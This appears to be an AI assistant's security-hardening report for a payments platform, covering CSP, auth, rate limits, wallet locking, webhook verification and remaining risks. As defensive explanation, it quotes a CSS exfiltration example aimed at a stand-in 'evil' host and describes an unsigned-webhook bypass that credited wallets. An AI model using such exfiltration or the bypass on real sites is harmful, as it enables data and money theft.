# DATAHOOD — Security Hardening

**Companion to `SECURITY-AUDIT.md`.** That document is the *findings* report: what was
wrong, at what severity, as the code stood before this work. This document is the
*answer* to it — what is now in place, where it lives, why each control is shaped the
way it is, and, in its own section at the end, what is still soft. Read them together.
If the two ever disagree, the code wins and this file is stale.

**Last revised:** 2026-08-19.

---

## Before anything else: "cannot be penetrated" is not a state a system reaches

The request that produced this work asked for a layer that cannot be penetrated. I want
to be straight with you rather than agreeable, because you are about to take real money
from real people with this code.

No such layer exists, and any document that claims one is lying to you. What is
achievable — and what has been done — is this: every hole confirmed in the audit is
closed; several classes of attack are now structurally impossible rather than merely
unlikely (a double-spend cannot happen because the database refuses it, not because the
code checks first); the remaining soft edges are named in the final section instead of
being papered over; and the system now *tells you* when something is wrong instead of
failing quietly.

The single most valuable property added is not any individual control. It is that the
quiet failures are now loud. A platform that is 95% secure and reports its own problems
is safer in practice than one that is 99% secure and says nothing, because the first one
gets fixed and the second one gets breached at leisure.

---

## Layer 1 — The boot refusal

`utils/bootGuard.js`, called from `server.js:47` before a single route is mounted.

The most common way a well-built application becomes insecure is not a clever attack. It
is a missing environment variable in production. So the process now refuses to start at
all if any of the following is true: `NODE_ENV` is not exactly `production`,
`development` or `test`; `JWT_SECRET` or `APP_ENCRYPTION_KEY` is unset, appears in the
built-in placeholder list, is shorter than 32 characters, or is made of fewer than 8
distinct characters (which catches `aaaaaaaa…` padding to length); `CLIENT_ORIGINS`
contains any `http://` entry in production; or `DEBUG_SQL` / `DEBUG_CONSOLE` is left
on. Each of those is a refusal, printed to stderr and then `process.exit(1)`, because a
site that will not start gets fixed in five minutes whereas a site running on a default
JWT secret gets discovered months later by someone else.

Three checks warn rather than refuse, deliberately: a missing `ADMIN_ALERT_EMAIL`, a
remote `DB_HOST` without `DB_SSL=true`, and `DB_SSL_REJECT_UNAUTHORIZED=false`. Those
degrade the service rather than breaking its security model, and refusing to boot over
them would be the guard crying wolf. In non-production every refusal is downgraded to a
warning so local development is not held hostage.

## Layer 2 — The browser's own enforcement

`deploy/nginx-security-headers.conf`, included per-`location` in `deploy/nginx.conf`.

A Content-Security-Policy of `default-src 'self'; script-src 'self'; object-src 'none';
base-uri 'none'; frame-ancestors 'none'` and no third-party origin of any kind. That
tightness is only possible because of a product decision: wallet funding is by dedicated
virtual bank account plus a server-to-server webhook, so there is no hosted checkout SDK
to allowlist. If a gateway script is ever added, `script-src` is the line that will block
it, and the fix is to name that exact origin — never to add `'unsafe-inline'`.

Two relaxations are deliberate and documented in the file itself. `style-src` allows
`'unsafe-inline'` because React `style={{…}}` props become element style attributes,
which CSP governs under `style-src`; removing it breaks layout across the admin screens,
and the residual risk is CSS trickery rather than code execution. `img-src` allows
`data:` and `blob:` for the receipt renderer and the 2FA QR code, but pointedly **not**
`https:` — a wildcard image source is an exfiltration channel, since under XSS
`background:url(https://evil/?=<stolen>)` is a GET the browser makes happily. The known
cost is that a remote image pasted into a newsletter body will not render in the admin
preview iframe; the email itself is unaffected because it renders in the recipient's mail
client.

Alongside the CSP: `X-Frame-Options: DENY` (duplicating `frame-ancestors` because it is
the only one older browsers understand, and a clickjacked wallet is worth two locks),
`nosniff`, `Referrer-Policy: strict-origin-when-cross-origin` so a support link clicked
from `/admin/users/82` does not tell the destination which customer an admin was looking
at, a `Permissions-Policy` denying camera, microphone, geolocation, USB, magnetometer and
payment, and `Cross-Origin-Opener-Policy` / `Cross-Origin-Resource-Policy` set to
`same-origin`.

Two operational details in that file matter more than they look. First, the headers live
in a separate snippet and are `include`d at each level that needs them, because nginx's
`add_header` does **not** merge across levels: a `location` block with even one
`add_header` of its own discards every inherited one. `nginx.conf` has two such locations,
and one of them serves `index.html` — precisely the document that needs the CSP. Declaring
these once in `server` would have protected every URL except the HTML shell, silently,
while `curl -I https://domain/` followed a path that made it look like it worked. Second,
the snippet is **not** included on `location /api/`, because Express sets its own headers
there via `helmet()`. Two CSP headers on one response is not "the stricter one wins" — the
browser enforces both, so the effective policy is their intersection and no single file
explains the result. nginx owns what nginx serves; helmet owns what Express serves.

HSTS is `max-age=31536000` with **no** `includeSubDomains` and **no** `preload`, on
purpose. `includeSubDomains` would force https on every subdomain for a year including
any that has no certificate yet — the legacy PHP install, webmail, a staging box — and
browsers cache the directive, so the mistake cannot be undone by removing the header. Add
it only after confirming every subdomain either has TLS or is gone.

## Layer 3 — Identity, and the difference between "not logged in" and "database down"

`middleware/auth.js`.

A token is verified, then its role is checked (`decoded.role !== 'user'` → 403), then the
subscriber row is loaded from the **database** rather than trusted from the claims. That
last point is what makes the next control real: `(decoded.tv ?? 0) !== (user.sTokenVersion || 0)`
→ 401. A token version column on the user row means a leaked JWT can actually be
revoked — bump the column and every existing token for that account dies. Before this, a
stolen token was valid for its full seven days and a password change did nothing to it.
The admin path mirrors this against `sysTokenVersion`, and `sysRole` is read from the
database row on every request and deliberately kept **out** of the token, so a
privilege change takes effect immediately rather than at next login.

One inverted-polarity trap worth knowing about, because it would lock you out of your own
site: `sysStatus` is `0` for an **active** admin. The check is therefore
`Number(admin.sysStatus) !== 0 → 403`. Reading it the intuitive way round disables every
working admin and enables every disabled one.

The subtler fix in this file is about error classification. The catch block splits three
ways: `TokenExpiredError` → 401, `JsonWebTokenError`/`NotBeforeError` → 401, and anything
else → log and `next(err)`, i.e. a 500. That third branch is why a database blip no longer
logs every user out — previously a connection error exited through the auth catch, was
reported as 401, and the entire user base was signed out by a network hiccup. `next()`
also sits *outside* the try, so a downstream controller throwing cannot be relabelled as
an invalid token. **401 is now reserved strictly for authentication failure**, which is
what makes it a usable signal.

## Layer 4 — Abuse control

One global limiter plus fourteen targeted ones (`server.js:135-161`,
`middleware/rateLimit.js`). The global limiter is 1200 requests per 15 minutes on `/api`
and deliberately **skips** `/health` and every `/auth/*` path, because those have their
own stricter limiters and a global counter would let ordinary browsing exhaust the budget
that protects the login form.

| Surface | Window / max | Keyed on |
|---|---|---|
| `POST /auth/login` | 15 min / 8 | IP + identifier |
| `POST /auth/admin/login` | 15 min / 5 | IP + username |
| `POST /auth/register` | 60 min / 15 | IP |
| `POST /auth/forgot-password` | 60 min / 6 | IP + identifier |
| Reset-code verify + reset | 15 min / 20 | IP + identifier |
| PIN reset request + reset | 15 min / 20 | Session id, else IP |
| Admin 2FA verify/confirm/disable | 15 min / 30 | `sysId`, else challenge-token subject, else IP |
| Admin profile / password / email | 15 min / 20 | `sysId`, else IP |
| All `/auth/*` traffic | 15 min / 120 | IP |
| Newsletter signup | 60 min / 5 | IP + email |
| Newsletter token endpoints | 15 min / 60 | IP |
| Admin newsletter send | 60 min / 6 | `sysId`, else IP |
| Blacklist submit | 60 min / 10 | `sId`, else IP (admins skipped) |
| Data export / account deletion | 60 min / 10 | `sId`, else IP |

Keying on IP **and** account identifier matters: the audit's C3 finding was that a
4-digit transaction PIN is 10,000 combinations and a single global limiter does not stop
an attacker with rotating IPs from grinding one account. Per-account keying does.

The transaction PIN itself is handled in `utils/pin.js`: bcrypt comparison, a
per-account lockout of 5 attempts per 15 minutes, and legacy plaintext PINs upgraded to a
hash on the next correct entry. One deliberate refusal is recorded there — the legacy
`sPinStatus` column is a PIN-*bypass* flag (`1` = PIN disabled) inherited from the PHP
system, and it is **not** honoured. Respecting it would let a legacy flag on a row spend
that user's balance with no PIN at all.

## Layer 5 — Money integrity, moved from checks into constraints

This is the part I would ask you to trust least on my word and verify most in practice,
because it is where the audit found the worst problems (C1 and C2) and where the fixes
had to change shape rather than add validation.

Every balance movement now goes through `utils/walletOps.js`, and the mechanism is a
database transaction with a `SELECT … FOR UPDATE` row lock: the balance read, the
sufficiency test and the write all happen inside the lock, and the `wallet_ledger` row is
written on the same transaction. Previously each purchase did read → compare → subtract →
save with no lock, so N concurrent requests with enough balance for one all passed the
check before any of them committed. The lock makes that arithmetically impossible rather
than unlikely. Nothing may write `sWallet` or `sRefWallet` directly; that rule exists so
there is exactly one place where money moves and exactly one place to audit.

Wallet funding adds a second, stronger mechanism. `fundWalletOnce()` creates the
`Transaction` row **first**, so the `UNIQUE` index on `transactions.transref` is the
mutex; a duplicate key returns `{ reason: 'duplicate' }` and the credit never runs twice.
That index is statement 1 of `backend/sql/security_hardening_prod.sql`, and
`scripts/migrate.js` treats error 1062 on it as **fatal on purpose** — 1062 there means
the table already contains duplicate references, i.e. money already recorded twice, and
reporting that as "already applied" would leave every idempotency guard in the codebase
trusting a mutex that was never created. If that migration fails, that is the system
telling you something true about your existing data. Reconcile it; do not force past it.

Layered above that is `middleware/idempotency.js`, mounted on every money route after
`requireUser`. It inserts a primary-key row (`sId:endpoint:key`) as the lock, so there is
no select-then-insert gap. A replayed request with a matching fingerprint gets the stored
response code and body back verbatim; a *different* body under the same key gets 422
rather than being executed, which is the case that would otherwise let a retry buy
something the user did not ask for. The fingerprint is a SHA-256 over the stable-stringified
body with `pin`, `password` and `otp` excluded, so the guard never stores a secret. An
in-flight duplicate gets 409, with a stale variant after two minutes. Keys expire after 24
hours, swept opportunistically on 2% of requests. The response hook releases the key on a
4xx, and on a 5xx **only** when `res.locals.walletRestored === true` — meaning the wallet
was demonstrably put back, so a retry is safe. Every other 5xx holds the key, because
releasing a key after an unknown failure is how a retry double-charges.

Admin money actions are locked too: `adminChangeTxnStatus` and `adminReconcileTxn` take a
row lock on the transaction itself, enforce a purchase-only direction guard, and gate the
money move on an audit-row probe using `escapeLike()` on the reference. Transaction
references are validated against an allow-list (`^[A-Za-z0-9_-]{8,64}$`) with reserved
prefixes (`DEBIT-`, `REFUND-`, `ADM`) refused, in `utils/refGuard.js`.

## Layer 6 — The webhook trust boundary

`controllers/paymentController.js`. The audit's C1 was the worst finding in the report:
the webhook credited wallets, was public, and its signature check was written as
`if (provider === 'monnify' && signature && secret)`. Sending **no** signature header
short-circuited the condition and the wallet was credited anyway. Two of the three
gateways were never verified at all.

Now: all three providers are verified (`monnify`, `paymentpoint`, `palmpay`), and every
missing precondition is a **rejection** rather than a skip — no signing secret is 403, a
missing signature header is 403, a signature mismatch is 403, an unknown provider is 400,
and an inactive or unconfigured provider row is 400. The comparison is
`crypto.timingSafeEqual` behind a length pre-check. Verification runs against
`req.rawBody`, captured by the `verify` hook on the JSON body parser (`server.js:106-111`),
with **no** `JSON.stringify(req.body)` fallback — a re-serialised body does not
byte-for-byte match what was signed, and a fallback would silently turn every verification
into a coin flip.

Beyond the signature: payment status is checked *before* crediting (`paid`, `success`,
`successful`, `completed`; anything else is acknowledged with 200 and no credit, so the
gateway stops retrying), a missing reference or a non-positive amount is 400, and the
owning account is resolved on `(gateway, accountReference)` first with the legacy
`sVirtualAccountRef` only as a fallback. That compound key matters because reserved
accounts are one-per-gateway; keying on the legacy single column alone credits the wrong
gateway's account.

**This one is executed, not reasoned about.** `backend/scripts/verify_webhook_credit.js`
runs the real `webhookHandler` from the real file against stubbed persistence — no database
— and as of 2026-08-19 it passes 49 assertions. Run it with
`node scripts/verify_webhook_credit.js` from `backend/`; exit 0 means all 49 passed.

Two of those 49 were added on 2026-08-19 because the suite had a hole in exactly the shape
of the original bug. It asserted that a **wrong** signature is rejected — `deadbeef`, which
reaches the HMAC comparison and loses there — but it never sent a delivery with **no
signature header at all**, which is the case C1 actually exploited. Those are different code
paths: a wrong signature is caught by a failing comparison, a missing one can only be caught
by a guard, and if the guard is deleted there is no failing comparison left behind to
notice. The same gap existed for a provider row with no `secretKey`. Both are now asserted,
and both were proven to bite: restoring the historical
`if (providerName === 'monnify' && signature && secret)` gate on a copy of the tree made an
**unsigned** delivery answer `200 {"status":"success"}` and credit a test wallet
`500 → 750,500`. Removing only the secret half, and only the signature half, each failed
only its own assertions — so the two checks are independent rather than one of them carrying
the other.

**What is not done here, and you should know it:** the amount is taken from the signed
payload and is not re-confirmed by calling the gateway back. See the residual risks.

**One operational trap in that script, worth knowing before you debug the wrong thing.** If
it prints nothing at all and exits 1, the suite did not fail — it never started.
`utils/crypto.js` does `import bcrypt from 'bcrypt'`, and where the native binding cannot
load (a container that did not build it itself, a copied `node_modules`, an architecture
change) that throws during module load; `utils/logger.js` catches it on
`process.on('uncaughtException')`, writes it to the **file** log and exits 1. Because this
project forbids console output, the crash leaves zero bytes on stdout and stderr. The real
cause is the newest line in `backend/logs/error-<today>.log`. The same silence applies to
any script here, and on a real server it is the behaviour you want; it is only confusing the
first time.

## Layer 7 — Detection, and the reason this section exists at all

Everything above prevents. This layer is how you find out.

`admin_audit_log` records who did the privileged thing, from where, and whether it
succeeded or was refused. It is the necessary complement to `wallet_ledger`, which records
that a balance moved but not who moved it — and most of the actions worth reviewing move
no money at all and leave no ledger row: granting a permanent pricing tier, disabling
another admin's 2FA, repointing a provider's base URL at a host that harvests the API key.
Writes go through `utils/auditLog.js` only. It redacts by substring key match against a
list covering `pin`, `password`, `secret`, `token`, `otp`, `apikey`, `authorization`,
`bvn`, `nin`, `card`, `cvv` and `signature`, recursing four levels deep, and truncates
`detail` to 4000 characters. Naming matters when redaction is substring-based: a detail key
of `apiKeyRotated` is destroyed by the `apikey` rule, so the convention is
`credentialsChanged`.

**The fix made on 2026-08-19, and the one I would most like you to understand**, because
the failure mode is general. `utils/auditLog.js` opens with "RULE 1: THIS MUST NEVER
THROW" and swallows its own insert failure. That is the right call — an audit write must
never be able to fail a refund a customer is waiting for. The cost is that when the table
is absent, *nothing* reports it: no failed request, no error page, one line in a log file
nobody reads until an incident. The model, the helper and around twenty call sites can all
be present and correct while the layer records absolutely nothing.

And the table *was* absent, for a reason worth recognising elsewhere in your stack. Its
`CREATE TABLE` was statement 2 of `security_hardening_prod.sql`, sitting directly behind
the `ADD UNIQUE (transref)` that `migrate.js` treats as fatal by design. On any database
carrying one duplicate reference, the run aborted at statement 1 and the audit table was
never created — while the operator, entirely correctly, went off to reconcile money and
never learned the detection layer had not been installed. A statement that *cannot* fail
on existing data must never sit downstream of one whose job is to stop the run. It now
lives in `backend/sql/admin_audit_log_table.sql` and runs early; section 2 of the old file
is reduced to a pointer that records why.

The compensating control is `utils/schemaGuard.js`, which at boot compares what each model
declares against what the live table actually has. `AdminAuditLog` is now in its guarded
list *specifically because it is fail-open* — a component that cannot fail loudly has to be
proven present some other way, and anything else fail-open added later belongs on that list
for the same reason. Its catch block now distinguishes ER_NO_SUCH_TABLE (1146) from every
other query failure: a missing table is a pending migration, deterministic and fixable by
one command, and is reported as the most severe form of drift; an unreachable database is
transient and only warns, because shouting "SCHEMA DRIFT — run migrations" during a network
blip sends you to run DDL against a host you cannot reach. The drift message is worded to
pre-empt the wrong conclusion — an absent table looks like data loss and it is not, since
there was never anywhere to write.

Supporting this: every error log carries `at` (the log call site) and `thrownAt` (derived
from `err.stack`), so a stack trace is never needed in a customer-facing response to
locate a fault. Provider and internal diagnostics never reach a toast — `utils/publicErrors.js`
maps a `reason` to user-facing copy, and the Express error handler returns a generic 500.

## Layer 8 — Data protection

NDPA machinery lives in `services/privacyService.js`: a retention cap with a purge job,
cascade erasure through one shared eraser, and self-service export. Erasure of financial
records is **anonymisation, not deletion** — the transaction survives without the person
attached to it, because a payments platform that can delete its own ledger on request has
no ledger. `admin_audit_log` is deliberately excluded from the purge: it holds staff
identifiers rather than customer data, and a customer erasure request must not be able to
delete the evidence of an admin acting on that customer's account.

For KYC, only the identity **type** is stored, never the BVN or NIN number itself. The
shareable receipt (PNG, PDF and email) carries no money figure at all, which is a privacy
control for your resellers rather than a cosmetic one — a receipt showing the amount would
expose their margin to their own buyer.

---

## What is still soft — read this section twice

None of the following is a reason not to launch. All of it is a reason not to believe the
word "impenetrable".

**The webhook amount is trusted after signature verification.** A valid signature proves
the message came from the gateway; it does not prove the gateway's own state. The stronger
form is to re-query the gateway's transaction-lookup API server-to-server and credit the
amount *it* reports. This is the largest remaining gap in the money path, and it is the one
I would close next.

**The auth token lives in `localStorage`.** Any successful XSS is therefore full account
takeover. The CSP in Layer 2 is the main thing standing between those two facts, which is
why `script-src 'self'` matters so much and why adding `'unsafe-inline'` to it would
quietly undo a lot of this document. An httpOnly cookie with CSRF protection is the
structural fix.

**Rate limiters and the PIN lockout are in-process memory.** They reset on restart and are
not shared across processes. That is sound only because the deployment is a single Node
process on a single VPS — it is a real constraint of the current hosting choice, not an
oversight, and moving to multiple workers or a second box requires a shared store first,
or every limit above silently multiplies by the number of processes.

**Two guards fail open by design.** The audit logger swallows its errors (Layer 7
explains why, and `schemaGuard` now compensates), and `middleware/idempotency.js` calls
`next()` on an unexpected database error rather than refusing the purchase. Both are
deliberate availability trades. Both mean a database problem degrades a *protection*
rather than the service.

**`style-src 'unsafe-inline'`** remains, for the reason given in Layer 2.

**`sApiKey` is stored in plaintext** on the subscriber row. It currently authenticates
nothing, so the exposure is theoretical — but if a public API is ever built on that column,
hash it first.

**No WAF, no HSTS preload, no 2FA for ordinary users.** Admin 2FA exists (TOTP, with the
challenge token carrying a non-admin role, which is what makes the gate real rather than
decorative); user 2FA does not.

**Nothing in this session was executed.** The isolated Linux environment failed to start
on eleven consecutive attempts, so no `node --check`, no run of
`scripts/verify_schema_guard.js`, and no mutation harness. Every change made today was
verified by full re-read instead. That is weaker and I am not going to describe it as
equivalent. `scripts/verify_schema_guard.js` is written and ready; please run it.

**One verification trap that cost me a wrong diagnosis today, recorded so it does not cost
you one.** `Grep`/ripgrep honours `.gitignore`, and `*.sql` is gitignored in this repo to
keep the leaked legacy dumps out of git. A content search therefore returns **zero matches
across all of `backend/sql/`**, and that emptiness reads exactly like "this migration does
not exist". It is how a duplicate `CREATE TABLE` came to be written. Any question of the
form "does the migration for X exist?" must be answered with a directory listing and a
direct read.

---

## Before you take real money

| # | Action | Why it blocks launch |
|---|---|---|
| 1 | **Rotate both Monnify production keys** | Two live keys were committed in legacy SQL dumps. The dumps are deleted; the keys are still valid until rotated. Nothing else on this list matters as much. |
| 2 | Set `NODE_ENV=production` | Every prod-only refusal in Layer 1 is inert without it, including the CORS fail-closed and the `http://` origin check. |
| 3 | Purge or rotate `backend/logs/` | Around 19,000 lines including SQL statements and a small number of customer phone numbers and email addresses. |
| 4 | `cd backend && node scripts/migrate.js` | Creates the audit table and the two UNIQUE indexes the money guarantees rest on. **Expect statement 1 of `security_hardening_prod.sql` to fail if duplicate transrefs exist — that is the design. Reconcile, do not bypass.** |
| 5 | Restart, then read the first 20 log lines | This is where `bootGuard` and `schemaGuard` speak. A `SCHEMA DRIFT` line here means a migration did not land. |
| 6 | Set `ADMIN_ALERT_EMAIL`; consider `DB_SSL=true` | Warn-level in Layer 1. The second matters if the database is not on localhost. |
| 7 | `npm run build` in `frontend/` | No JSX parser exists in my sandbox, so the frontend has never had a real build verified. This is yours to run. |
| 8 | `curl -sI` the header checks in `nginx-security-headers.conf`, then read the browser console | A CSP that blocks something real reports it there and nowhere else. Confirm `index.html` returns exactly one CSP header. |
| 9 | `node scripts/verify_schema_guard.js` | Expect `RESULT: PASS (controls all caught)`. It also asserts that exactly one `.sql` file creates `admin_audit_log`. |
| 10 | Push the repository | Nothing has been pushed since the baseline history rewrite. All of this work exists in one place. |

Also outstanding but not launch-blocking: the WhatsApp provider row needs configuring or
disabling, the Meta templates need approval, and
`scripts/repair_stranded_virtual_accounts.js` should be run for user 82.
